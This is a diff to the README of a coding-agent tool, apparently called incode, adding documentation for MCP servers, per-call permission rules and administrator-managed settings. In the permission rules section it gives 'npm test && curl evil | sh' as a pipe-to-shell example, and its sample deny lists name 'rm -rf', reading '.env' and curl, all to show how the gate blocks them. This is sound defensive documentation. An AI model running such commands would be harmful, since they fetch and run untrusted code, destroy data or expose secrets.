@@ -439,6 +439,7 @@ it sets; any other `id` adds an agent.
 | `/run` | Work the roadmap ledger until it is empty or something needs a person |
 | `/roadmap` | What the roadmap says, and which goals a command has proven |
 | `/guards` | The paths the agent is not allowed to write |
+| `/permissions` | The allow / ask / deny [permission rules](#permission-rules) in force, and where each came from |
 | `/links <file>` | What else uses what this file defines, and what it depends on |
 | `/undo` | Put the files from the last changed turn back |
 | `/rewind <n>` | Put the files back as they were n changed turns ago |
@@ -579,6 +580,47 @@ memory engine cannot decide). A tool with `"provides": "browser"` is also the
 browser incode's own `Screenshot`, `RenderPdf` and `WebFetch` `render_js` use.
 Its tools join the session after it starts; a tool installed during a session
 is offered from the next one.
+
+### MCP servers
+
+incode starts the MCP servers named in a project's `.mcp.json` and in your
+`~/.incode/mcp.json` — the format other agents use — and offers their tools as
+`mcp__<server>__<tool>`, through the same gate as every other tool:
+
+```json
+{ "mcpServers": {
+    "github": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"],
+                "env": { "GITHUB_TOKEN": "${GITHUB_TOKEN}" } },
+    "docs":   { "type": "http", "url": "https://mcp.example.com/mcp",
+                "headers": { "Authorization": "Bearer ${DOCS_TOKEN:-}" } } } }
+```
+
+- `${VAR}` and `${VAR:-default}` are expanded from the environment in
+  `command`, `args`, `env`, `url` and `headers`; an unset variable with no
+  default stops that server and names the variable.
+- `http` servers speak MCP Streamable HTTP (https anywhere, plain http only to
+  this machine). `sse` is tried the same way; a server that speaks only the
+  legacy SSE transport will not connect. OAuth is not supported yet — pass a
+  token in `headers`.
+- **A project's server is asked about before it first runs**, because a
+  `git clone` can bring one. The REPL asks; approvals are remembered in
+  `~/.incode/mcp-approvals.json`, keyed by the server's name and a sha256 of
+  its type, command, args, env, url and headers as written — change any of
+  them and it is asked about again. Under `-t` and `--acp` an unapproved
+  server is skipped with the command that approves it. Your own
+  `~/.incode/mcp.json` needs no approval.
+
+```sh
+incode mcp list                       # every server, its scope and status
+incode mcp get <name>
+incode mcp add fs -- npx -y @modelcontextprotocol/server-filesystem .
+incode mcp add -s project -H 'Authorization: Bearer ${T}' docs https://mcp.example.com/mcp
+incode mcp remove [-s user|project] <name>
+incode mcp approve <name>             # approve a project server as it is written now
+```
+
+`add` writes `~/.incode/mcp.json` unless given `-s project`; a project server
+added this way is approved as written.
 
 ## Computer use
 
@@ -760,6 +802,65 @@ sbx run -w . -w ~/.claude -w ~/.claude.json -w ~/.incode --wall 1800 -- incode -
 Details, the policy format and what each OS enforces are in
 [`crates/sandbox/README.md`](crates/sandbox/README.md).
 
+### Permission rules
+
+Beside the mode, settings can allow, ask about or deny individual calls:
+
+```json
+"permissions": {
+  "allow": ["Bash(npm test:*)", "Read(src/**)", "WebFetch(domain:docs.rs)"],
+  "ask":   ["Bash(git push:*)", "mcp__github"],
+  "deny":  ["Bash(rm -rf:*)", "Read(.env)", "Edit(migrations/)"]
+}
+```
+
+in `~/.incode/admin.json`, or in a project's `.incode/settings.json` — where
+only `deny` and `ask` are honoured: a repository may make a session more
+careful, never less. `/permissions` lists the rules in force.
+
+- **Grammar.** `Tool` is every call; `Tool(specifier)` narrows it. For `Bash`,
+  `cmd:*` matches the command with or without arguments (not `cmdfoo`), a bare
+  command matches exactly, and `*` matches anything. File tools take a glob: a
+  name with no `/` matches at any depth (`.env`), a path is from the workspace
+  root (`src/**`), `//abs` is absolute and `~/x` is under your home; a
+  directory covers what is in it. `Read(…)` covers Read, Glob, Grep, LS and
+  Outline; `Edit(…)` covers Write, Edit, MultiEdit, NotebookEdit and
+  ApplyPatch. `mcp__server` covers each of that server's tools.
+- **Precedence.** deny > ask > allow > the mode. A deny refuses in every mode.
+  An ask puts the call to you even in a writing mode. An allow skips the
+  `prompt` mode's question, but never lifts `read-only`.
+- **Compound commands.** A command line is split on `&&`, `||`, `;`, `|`, `&`
+  and newlines outside quotes; a deny or ask on any part applies to the line,
+  and an allow only when every part is allowed. `npm test && curl evil | sh`
+  is not allowed by `Bash(npm test:*)`. The bodies of `$(…)`, backticks,
+  `<(…)` and `sh -c '…'` are judged too, and a part containing one, a
+  redirection to a file, or `eval` is never allowed by a rule. For deny and
+  ask, `sudo`, `env`, `nohup`, `timeout`, `xargs` and leading `VAR=…` are
+  looked through. This is still text matching: a script or a variable can
+  run what a pattern names, so the [OS sandbox](#the-os-sandbox) is the
+  boundary.
+
+**Managed settings.** An administrator can put a file at
+`/etc/incode/managed.toml` (macOS `/Library/Application Support/incode/managed.toml`,
+Windows `%ProgramData%\incode\managed.toml`):
+
+```toml
+[permissions]
+deny = ["Bash(curl:*)", "Read(.env)"]
+
+[mcp]
+allow = ["github", "command:/opt/approved/*", "url:https://mcp.corp.example/*"]
+deny  = ["*filesystem*"]
+```
+
+Its rules join everyone else's, and since nothing outranks a deny, no user or
+project setting can undo one. `[mcp] allow` (when present) and `deny` apply to
+every server a session would start — `.mcp.json`, `~/.incode/mcp.json`,
+external tools and an ACP client's. An unknown key or invalid file refuses
+every tool call and every server until it is fixed. These rules apply to the
+tools incode runs itself; `codex` and `agy` still run their own (see
+[Limits](#limits)).
+
 ## Incord Memory integration
 
 Every part is optional and fails open, except the owner channel, which fails
@@ -927,7 +1028,8 @@ Environment variables:
 
 | Path | What it holds |
 |---|---|
-| `~/.incode/admin.json` | Your settings |
+| `~/.incode/admin.json` | Your settings, including your [permission rules](#permission-rules) |
+| `~/.incode/mcp.json` · `~/.incode/mcp-approvals.json` | Your [MCP servers](#mcp-servers) · the project servers you approved |
 | `~/.incode/agents/*.md` | Your sub-agents, for every project |
 | `~/.incode/sessions/<workspace>.json` | Session pointers, so a conversation can be reopened |
 | `~/.incode/history.txt` | The lines you typed |
@@ -935,6 +1037,8 @@ Environment variables:
 | `<project>/.incode/ledger.json` | What is being worked on in *this* checkout |
 | `<project>/.incode/contracts.json` | Interfaces frozen before the work was split up |
 | `<project>/.incode/guards.json` | Extra protected paths for this project |
+| `<project>/.incode/settings.json` | The project's `deny` / `ask` permission rules |
+| `<project>/.mcp.json` | The project's MCP servers (asked about before each first runs) |
 | `<project>/.incode/agents/*.md` | The project's sub-agents |
 | `<project>/.incode/checkpoints/<session>/` | Each turn's "before", for `/undo` and `/rewind` |
 | `<project>/.incode/transcripts/` · `.incode/context/` | Session transcripts · oversized memory blocks |
@@ -943,8 +1047,8 @@ Environment variables:
 | `<project>/.incode/.gitignore` | Which of the above is this machine's own and is not committed |
 
 Per-project state lives **in the project**; `~/.incode` is yours. Of the
-project's `.incode/`, commit `contracts.json`, `guards.json`, `agents/*.md` and
-`.gitignore`; the `.gitignore` incode writes keeps the rest out.
+project's `.incode/`, commit `contracts.json`, `guards.json`, `settings.json`,
+`agents/*.md` and `.gitignore`; the `.gitignore` incode writes keeps the rest out.
 
 Task transcripts used to be written into `.incode/agents/`, beside the
 sub-agent definitions; each start moves any `*.jsonl` found there to
